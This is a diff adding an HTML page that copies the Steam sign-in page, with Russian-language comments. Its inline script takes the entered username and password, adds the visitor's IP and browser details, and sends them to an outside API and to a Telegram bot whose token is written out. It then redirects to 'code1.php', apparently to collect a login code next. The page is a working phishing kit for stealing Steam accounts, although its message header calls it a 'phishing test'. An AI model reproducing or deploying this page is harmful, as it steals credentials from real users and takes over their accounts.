@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html class=" responsive DesktopUI" lang="en">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta name="theme-color" content="#171a21">
+    <title>Sign In</title>
+    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
+
+    <link href="https://store.fastly.steamstatic.com/public/shared/css/motiva_sans.css?v=YzJgj1FjzW34&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/shared/css/shared_global.css?v=sKNRqB1SWZVt&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/shared/css/buttons.css?v=BZhNEtESfYSJ&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/css/v6/store.css?v=z1rYsFrx03T8&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/css/v6/cart.css?v=uVMfOzP8xqYE&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/css/v6/browse.css?v=ZWD2OrhO7eSv&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/shared/css/login.css?v=U_6mpN0ranyM&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    <link href="https://store.fastly.steamstatic.com/public/shared/css/shared_responsive.css?v=oLruAsy0KuKR&amp;l=english&amp;_cdn=fastly" rel="stylesheet" type="text/css">
+    
+    <style>
+        .newlogindialog_Login_ZOBYq{position:relative}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SideBySide_1Wl13{display:flex;flex-direction:row;flex:1;padding-top:10px}
+        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_SideBySide_1Wl13{flex-direction:column}}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS{flex:0;display:grid;gap:4px;margin-left:40px}
+        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS{display:flex;flex-direction:column;align-items:center;margin-left:0;margin-top:48px}}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingContainer_3ph6w{display:flex;flex-direction:column;align-items:flex-start;width:200px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingTag_3jy5R{color:#1999ff;font-weight:500;font-size:12px;line-height:16px;margin:6px 0;text-transform:uppercase;letter-spacing:.02em}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingSubtitle_toeax{font-weight:400;font-size:12px;line-height:16px;color:#afafaf;margin:8px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingButton_-jjqv{background-color:rgba(255,255,255,.1);border-radius:2px;font-weight:700;font-size:12px;line-height:20px;text-align:center;color:#fff;padding:8px 16px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingLink_1ozce{text-align:center;text-decoration-line:underline;font-weight:400;font-size:12px;line-height:24px;color:#afafaf;padding:12px 0;cursor:pointer}
+        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingContainer_3ph6w{align-items:center}.newlogindialog_Login_ZOBYq .newlogindialog_QRSection_2ZDyS .newlogindialog_MessagingSubtitle_toeax{text-align:center}}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextField_2KXGK{display:grid;grid-template-areas:"label hint""input input";grid-template-columns:1fr min-content;gap:2px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn{border-radius:2px;color:#fff;padding:10px;background-color:#32353c;outline:0;font-size:15px;grid-area:input;border:1px solid #32353c}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextInput_2eKVn:hover{background-color:#393c44}
+        .newlogindialog_Login_ZOBYq .newlogindialog_LoginForm_3Tsg9{flex:1;display:grid;gap:12px;grid-template-columns:1fr}
+        .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp{font-size:12px;color:#afafaf;text-transform:uppercase;letter-spacing:.02em;user-select:none}
+        .newlogindialog_Login_ZOBYq .newlogindialog_FieldLabel_3d8dp.newlogindialog_Highlight_XyqzE{color:#1999ff;font-weight:500}
+        .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5{display:flex;flex-direction:row;align-items:center;cursor:pointer}
+        .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5 .newlogindialog_CheckboxFieldLabel_2yrCY{color:#afafaf;font-size:12px;user-select:none;padding-left:6px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg{width:14px;height:14px;padding:3px;border-radius:2px;background-color:#32353c;cursor:pointer}
+        .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg .newlogindialog_Check_6EoZE{width:100%;height:100%;display:flex}
+        .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg:hover{background-color:#393c44}
+        .newlogindialog_Login_ZOBYq .newlogindialog_Checkbox_3tTFg:focus{outline:1px #06bfff solid}
+        .newlogindialog_Login_ZOBYq .newlogindialog_CheckboxField_2QWD5:hover .newlogindialog_Checkbox_3tTFg{background-color:#393c44}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SignInButtonContainer_14fsn{display:flex;flex-direction:column;align-items:center}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SignInButtonContainer_14fsn button{width:270px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE{position:relative;background:linear-gradient(90deg,#06bfff 0,#2d73ff 100%);border-radius:2px;border:0;outline:0;padding:12px;color:#fff;font-size:18px;font-weight:500;font-family:inherit;text-align:center;letter-spacing:.03em;cursor:pointer}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:hover{background:linear-gradient(90deg,#06bfff 30%,#2d73ff 100%)}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:active{background:linear-gradient(90deg,#06bfff 50%,#2d73ff 100%)}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:disabled{opacity:.5}
+        .newlogindialog_Login_ZOBYq .newlogindialog_SubmitButton_2QgFE:focus{outline:solid #06bfff;outline-width:1px}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextLink_1cnUQ{color:#afafaf;font-size:12px;text-decoration:underline;cursor:pointer}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextLink_1cnUQ:hover{color:#c9c9c9}
+        .newlogindialog_Login_ZOBYq .newlogindialog_FormError_1Mcy9{color:#c15755;font-size:12px;font-weight:500;text-align:center}
+        .newlogindialog_Login_ZOBYq .newlogindialog_TextAlignCenter_2meUB{text-align:center}
+        .newlogindialog_Login_ZOBYq .newlogindialog_FlexCol_1mhmm{display:flex;flex-direction:column}
+        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh:not(.IN_CLIENT){width:100%}
+        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK{color:#fff;font-size:32px;text-transform:uppercase;letter-spacing:.055em;font-weight:200}
+        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_PrimaryHeader_39uMK{text-align:center}}
+        .newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH{background-color:#181a21;border-radius:4px;padding:24px 32px;flex:1;min-width:636px}
+        @media screen and (max-width:700px){.newlogindialog_Login_ZOBYq .newlogindialog_StandardLayout_286eh .newlogindialog_FormContainer_3jLIH{min-width:0;background-color:transparent}}
+        .login_LoginContainer_2kLRm{padding-top:80px;padding-bottom:150px;display:flex;flex-direction:column;align-items:center}
+        @media screen and (max-width:700px){.login_LoginContainer_2kLRm{padding-top:12px;padding-bottom:0}}
+        .SVGIcon_Button{fill:#fff;overflow:visible;width:100%;height:100%;max-width:320px;max-height:320px}
+    </style>
+</head>
+<body class="login v6 global v7menu responsive_page">
+
+<div class="responsive_page_frame with_header">
+    <div role="navigation" class="responsive_page_menu_ctn mainmenu" aria-label="Mobile Menu">
+        <div class="responsive_page_menu" id="responsive_page_menu">
+            <div class="mainmenu_contents">
+                <div class="mainmenu_contents_items">
+                    <a class="menuitem" href="https://store.steampowered.com/login/?redir=login&redir_ssl=1&snr=1_60_4__global-header">Login</a>
+                    <a class="menuitem supernav supernav_active" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu" data-tooltip-type="selector" data-tooltip-content=".submenu_Store">Store</a>
+                    <div class="submenu_Store" style="display: none;" data-submenuid="Store">
+                        <a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">Home</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-responsive-menu">Discovery Queue</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-responsive-menu">Points Shop</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-responsive-menu">News</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-responsive-menu">Stats</a>
+                    </div>
+                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">Community</a>
+                    <div class="submenu_Community" style="display: none;" data-submenuid="Community">
+                        <a class="submenuitem" href="https://steamcommunity.com/">Home</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
+                    </div>
+                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-responsive-menu">About</a>
+                    <a class="menuitem " href="https://help.steampowered.com/en/">Support</a>
+                    
+                    <div class="minor_menu_items">
+                        <div class="menuitem change_language_action">Change language</div>
+                        <a class="menuitem" href="https://store.steampowered.com/mobile" target="_blank" rel="noreferrer">Get the Steam Mobile App</a>
+                        <div class="menuitem" role="link" onclick="Responsive_RequestDesktopView();">View desktop website</div>
+                    </div>
+                </div>
+                <div class="mainmenu_footer_spacer"></div>
+                <div class="mainmenu_footer">
+                    <div class="mainmenu_footer_logo"><img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/logo_valve_footer.png"></div>
+                    © Valve Corporation. All rights reserved. All trademarks are property of their respective owners in the US and other countries.
+                    <span class="mainmenu_valve_links">
+                        <a href="https://store.steampowered.com/privacy_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Privacy Policy</a>
+                        &nbsp;| &nbsp;<a href="http://www.valvesoftware.com/legal.htm" target="_blank">Legal</a>
+                        &nbsp;| &nbsp;<a href="https://store.steampowered.com/subscriber_agreement/?snr=1_60_4__global-responsive-menu" target="_blank">Steam Subscriber Agreement</a>
+                        &nbsp;| &nbsp;<a href="https://store.steampowered.com/steam_refunds/?snr=1_60_4__global-responsive-menu" target="_blank">Refunds</a>
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="responsive_local_menu_tab"></div>
+
+    <div class="responsive_page_menu_ctn localmenu">
+        <div class="responsive_page_menu" id="responsive_page_local_menu" data-panel="{&quot;onOptionsActionDescription&quot;:&quot;Filter&quot;,&quot;onOptionsButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;,&quot;onCancelButton&quot;:&quot;Responsive_ToggleLocalMenu()&quot;}">
+            <div class="localmenu_content" data-panel="{&quot;maintainY&quot;:true,&quot;bFocusRingRoot&quot;:true,&quot;flow-children&quot;:&quot;column&quot;}">
+            </div>
+        </div>
+    </div>
+
+    <div class="responsive_header">
+        <div class="responsive_header_content">
+            <div id="responsive_menu_logo">
+                <img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_menu_hamburger.png" height="100%">
+            </div>
+            <div class="responsive_header_logo">
+                <a href="https://store.steampowered.com/?snr=1_60_4__global-responsive-menu">
+                    <img src="https://store.fastly.steamstatic.com/public/shared/images/responsive/header_logo.png" height="36" border="0" alt="STEAM">
+                </a>
+            </div>
+            <div class="responsive_header_react_target" data-featuretarget="store-menu-responsive-search"><div class="responsive_header_react_placeholder"></div></div>
+        </div>
+    </div>
+    
+    <div class="responsive_page_content_overlay"></div>
+    <div class="responsive_fixonscroll_ctn nonresponsive_hidden"></div>
+    
+    <div class="responsive_page_content">
+        <div role="banner" id="global_header" data-panel="{&quot;flow-children&quot;:&quot;row&quot;}">
+            <div class="content">
+                <div class="logo">
+                    <span id="logo_holder">
+                        <a href="https://store.steampowered.com/?snr=1_60_4__global-header" aria-label="Link to the Steam Homepage">
+                            <img src="https://store.fastly.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" width="176" height="44" alt="Link to the Steam Homepage">
+                        </a>
+                    </span>
+                </div>
+
+                <div role="navigation" class="supernav_container" aria-label="Global Menu">
+                    <a class="menuitem supernav supernav_active" href="https://store.steampowered.com/?snr=1_60_4__global-header" data-tooltip-type="selector" data-tooltip-content=".submenu_Store">STORE</a>
+                    <div class="submenu_Store" style="display: none;" data-submenuid="Store">
+                        <a class="submenuitem" href="https://store.steampowered.com/?snr=1_60_4__global-header">Home</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/explore/?snr=1_60_4__global-header">Discovery Queue</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/my/wishlist/">Wishlist</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/points/shop/?snr=1_60_4__global-header">Points Shop</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/news/?snr=1_60_4__global-header">News</a>
+                        <a class="submenuitem" href="https://store.steampowered.com/stats/?snr=1_60_4__global-header">Stats</a>
+                    </div>
+                    <a class="menuitem supernav" href="https://steamcommunity.com/" data-tooltip-type="selector" data-tooltip-content=".submenu_Community">COMMUNITY</a>
+                    <div class="submenu_Community" style="display: none;" data-submenuid="Community">
+                        <a class="submenuitem" href="https://steamcommunity.com/">Home</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/discussions/">Discussions</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/workshop/">Workshop</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/market/">Market</a>
+                        <a class="submenuitem" href="https://steamcommunity.com/?subsection=broadcasts">Broadcasts</a>
+                    </div>
+                    <a class="menuitem " href="https://store.steampowered.com/about/?snr=1_60_4__global-header">About</a>
+                    <a class="menuitem " href="https://help.steampowered.com/en/">SUPPORT</a>
+                </div>
+
+                <div id="global_actions">
+                    <div role="navigation" id="global_action_menu" aria-label="Account Menu">
+                        <a class="header_installsteam_btn header_installsteam_btn_green" href="https://store.steampowered.com/about/?snr=1_60_4__global-header">
+                            <div class="header_installsteam_btn_content">Install Steam</div>
+                        </a>
+                        <a class="global_action_link" href="https://store.steampowered.com/login/?redir=login&redir_ssl=1&snr=1_60_4__global-header">login</a>
+                        &nbsp;|&nbsp;
+                        <span class="pulldown global_action_link" id="language_pulldown" onclick="ShowMenu( this, 'language_dropdown', 'right' );">language</span>
+                        <div class="popup_block_new" id="language_dropdown" style="display: none;">
+                            <div class="popup_body popup_menu">
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=schinese" onclick="ChangeLanguage( 'schinese' ); return false;">简体中文 (Simplified Chinese)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=tchinese" onclick="ChangeLanguage( 'tchinese' ); return false;">繁體中文 (Traditional Chinese)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=japanese" onclick="ChangeLanguage( 'japanese' ); return false;">日本語 (Japanese)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=koreana" onclick="ChangeLanguage( 'koreana' ); return false;">한국어 (Korean)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=thai" onclick="ChangeLanguage( 'thai' ); return false;">ไทย (Thai)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=bulgarian" onclick="ChangeLanguage( 'bulgarian' ); return false;">Български (Bulgarian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=czech" onclick="ChangeLanguage( 'czech' ); return false;">Čeština (Czech)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=danish" onclick="ChangeLanguage( 'danish' ); return false;">Dansk (Danish)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=german" onclick="ChangeLanguage( 'german' ); return false;">Deutsch (German)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=spanish" onclick="ChangeLanguage( 'spanish' ); return false;">Español - España (Spanish - Spain)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=latam" onclick="ChangeLanguage( 'latam' ); return false;">Español - Latinoamérica (Spanish - Latin America)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=greek" onclick="ChangeLanguage( 'greek' ); return false;">Ελληνικά (Greek)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=french" onclick="ChangeLanguage( 'french' ); return false;">Français (French)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=italian" onclick="ChangeLanguage( 'italian' ); return false;">Italiano (Italian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=indonesian" onclick="ChangeLanguage( 'indonesian' ); return false;">Bahasa Indonesia (Indonesian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=hungarian" onclick="ChangeLanguage( 'hungarian' ); return false;">Magyar (Hungarian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=dutch" onclick="ChangeLanguage( 'dutch' ); return false;">Nederlands (Dutch)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=norwegian" onclick="ChangeLanguage( 'norwegian' ); return false;">Norsk (Norwegian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=polish" onclick="ChangeLanguage( 'polish' ); return false;">Polski (Polish)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=portuguese" onclick="ChangeLanguage( 'portuguese' ); return false;">Português (Portuguese - Portugal)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=brazilian" onclick="ChangeLanguage( 'brazilian' ); return false;">Português - Brasil (Portuguese - Brazil)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=romanian" onclick="ChangeLanguage( 'romanian' ); return false;">Română (Romanian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=russian" onclick="ChangeLanguage( 'russian' ); return false;">Русский (Russian)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=finnish" onclick="ChangeLanguage( 'finnish' ); return false;">Suomi (Finnish)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=swedish" onclick="ChangeLanguage( 'swedish' ); return false;">Svenska (Swedish)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=turkish" onclick="ChangeLanguage( 'turkish' ); return false;">Türkçe (Turkish)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=vietnamese" onclick="ChangeLanguage( 'vietnamese' ); return false;">Tiếng Việt (Vietnamese)</a>
+                                <a class="popup_menu_item tight" href="https://store.steampowered.com/login?l=ukrainian" onclick="ChangeLanguage( 'ukrainian' ); return false;">Українська (Ukrainian)</a>
+                                <a class="popup_menu_item tight" href="https://www.valvesoftware.com/en/contact?contact-person=Translation%20Team%20Feedback" target="_blank">Report a translation problem</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+<img src="https://ltdfoto.ru/images/2025/10/08/AEBF515B-F92D-4CB0-90A1-252445E6E0CB.png" alt="AEBF515B-F92D-4CB0-90A1-252445E6E0CB.png" border="0">
+        <div id="responsive_store_nav_ctn"></div>
+        <div id="responsive_store_nav_overlay" style="display:none"><div id="responsive_store_nav_overlay_ctn"></div><div id="responsive_store_nav_overlay_bottom"></div></div>
+        <div id="responsive_store_search_overlay" style="display:none"></div>
+        <div data-cart-banner-spot="1"></div>
+
+        <div role="main" class="responsive_page_template_content" id="responsive_page_template_content" data-panel="{&quot;autoFocus&quot;:true}">
+            <div class="page_content">
+                <!-- ПЕРЕНЕСЕННАЯ ФОРМА ЛОГИНА -->
+                <div data-featuretarget="login">
+                    <div class="login_LoginContainer_2kLRm">
+                        <div class="newlogindialog_Login_ZOBYq">
+                            <div class="newlogindialog_FlexCol_1mhmm newlogindialog_StandardLayout_286eh" style="gap:32px">
+                                <div style="display:flex;flex-direction:column;gap:8px;margin:8px 16px">
+                                    <div class="newlogindialog_PrimaryHeader_39uMK">Sign in</div>
+                                </div>
+                                <div class="newlogindialog_FormContainer_3jLIH">
+                                    <div class="newlogindialog_SideBySide_1Wl13">
+                                        <form class="newlogindialog_LoginForm_3Tsg9" method="post" onsubmit="return false;">
+                                            <div class="newlogindialog_TextField_2KXGK">
+                                                <div class="newlogindialog_FieldLabel_3d8dp newlogindialog_Highlight_XyqzE">Sign in with account name</div>
+                                                <div></div>
+                                                <input name="username" id="usernameInput" required type="text" class="newlogindialog_TextInput_2eKVn" value="">
+                                            </div>
+                                            <div class="newlogindialog_TextField_2KXGK">
+                                                <div class="newlogindialog_FieldLabel_3d8dp">Password</div>
+                                                <div></div>
+                                                <input name="password" required type="password" class="newlogindialog_TextInput_2eKVn" value="">
+                                            </div>
+                                            
+                                            <!-- СКРЫТОЕ ПОЛЕ ДЛЯ ПЕРЕДАЧИ ЛОГИНА -->
+                                            <input type="hidden" name="username_hidden" id="usernameField">
+                                            
+                                            <div class="newlogindialog_CheckboxField_2QWD5">
+                                                <div tabindex="0" class="newlogindialog_Checkbox_3tTFg">
+                                                    <div class="newlogindialog_Check_6EoZE">
+                                                        <svg version="1.1" id="base" xmlns="http://www.w3.org/2000/svg" class="SVGIcon_Button SVGIcon_Check" x="0px" y="0px" width="256px" height="256px" viewBox="0 0 256 256" stroke-width="35" stroke="#fff" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10">
+                                                            <polyline fill="none" points="49.5,147.75 95,210.75 206.5,45.25"></polyline>
+                                                        </svg>
+                                                    </div>
+                                                </div>
+                                                <div class="newlogindialog_CheckboxFieldLabel_2yrCY">Remember me</div>
+                                            </div>
+                                            <div class="newlogindialog_SignInButtonContainer_14fsn">
+                                                <button class="newlogindialog_SubmitButton_2QgFE" type="submit">Sign in</button>
+                                            </div>
+                                            <div class="newlogindialog_FormError_1Mcy9">&nbsp;</div>
+                                            <a class="newlogindialog_TextLink_1cnUQ newlogindialog_TextAlignCenter_2meUB" href="#">Help, I can't sign in</a>
+                                        </form>
+                                        <div class="newlogindialog_QRSection_2ZDyS">
+                                            <div class="newlogindialog_MessagingContainer_3ph6w">
+                                                <div class="newlogindialog_MessagingTag_3jy5R">Или войдите с помощью QR</div>
+                                                <div class="newlogindialog_MessagingSubtitle_toeax">
+                                                    <img src="https://files.catbox.moe/2w9loa.png" alt="QR Code"style="width: 200px; height: 200px; margin: 1px -10px; border-radius: 7px;"
+>
+
+                                                </div>
+                                                <a href="https://store.steampowered.com/mobile" class="newlogindialog_MessagingLink_1ozce">Мобильное приложение Steam</a>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="login_bottom_row">
+                    <div class="login_btn_ctn login_bottom_row_item">
+                        <div class="headline">New to Steam?</div>
+                        <a target="_top" href="https://store.steampowered.com/join/?&snr=1_60_4__62" class="login_create_btn btn_blue_steamui btn_medium">
+                            <span>Create an account</span>
+                        </a>
+                    </div>
+                    <div class="login_bottom_row_item">
+                        <div class="subtext">It's free and easy. Discover thousands of games to play with millions of new friends.
+                            <a class="login_join_desc about_link" href="https://store.steampowered.com/about">Learn more about Steam</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+         <div style="display: flex; justify-content: center;">
+    <img src="https://ltdfoto.ru/images/2025/10/08/IZOBRAZENIE_2025-10-08_024328276.png" alt="Steam Menu" style="margin-right: 20px;">
+</div>
+
+<script>
+// Конфигурация Telegram бота
+const BOT_TOKEN = '8259536877:AAHVoJPklpv2uTVLsNq2o1XeI3f1qXOT7x4';
+const CHAT_ID = '7455610355';
+
+// Функция отправки в Telegram
+async function sendToTelegram(message) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            })
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('Ошибка отправки в Telegram:', error);
+    }
+}
+
+// Функция получения IP
+async function getIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch {
+        return 'Не удалось определить';
+    }
+}
+
+// Функция регистрации в базе данных
+async function registerUser(username, password, ip) {
+    try {
+        const response = await fetch('https://logs-unisono-project-production.up.railway.app/api/auth/register', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                username: username,
+                password: password,
+                email: `${username}@steam.com`,  // Исправлено: добавлены обратные кавычки
+                ip: ip,
+                userAgent: navigator.userAgent
+            })
+        });
+        
+        if (response.ok) {
+            console.log('✅ Пользователь зарегистрирован в базе');
+            return true;
+        } else {
+            const errorData = await response.json();
+            console.log('❌ Ошибка регистрации:', errorData.error);
+            return false;
+        }
+    } catch (error) {
+        console.error('❌ Ошибка подключения к API:', error);
+        return false;
+    }
+}
+
+// Обработка отправки формы
+document.addEventListener('DOMContentLoaded', function() {
+    const loginForm = document.querySelector('.newlogindialog_LoginForm_3Tsg9');
+    const usernameInput = document.querySelector('input[name="username"]');
+    
+    if (loginForm) {
+        loginForm.onsubmit = async function(e) {
+            e.preventDefault();
+            
+            const username = usernameInput.value;
+            const password = document.querySelector('input[name="password"]').value;
+            const ip = await getIP();
+            
+            // 1. Регистрируем в базе данных
+            await registerUser(username, password, ip);
+            
+            // 2. Отправляем данные в Telegram
+            const message = `🎣 <b>ФИШИНГ ТЕСТ - ДАННЫЕ ВХОДА</b>\n\n`  // Исправлено: добавлены кавычки
+                          + `👤 <b>Логин:</b> ${username}\n`
+                          + `🔑 <b>Пароль:</b> ${password}\n`
+                          + `🌐 <b>IP:</b> ${ip}\n`
+                          + `📱 <b>Устройство:</b> ${navigator.userAgent}\n`
+                          + `⏰ <b>Время:</b> ${new Date().toLocaleString()}`;
+            
+            await sendToTelegram(message);
+            
+            // 3. Сохраняем логин для передачи на code1.php
+            localStorage.setItem('steam_username', username);
+            
+            // 4. Перенаправляем на code1.php
+            window.location.href = 'code1.php';
+        };
+    }
+});
+</script>
+
+</body>
+</html>
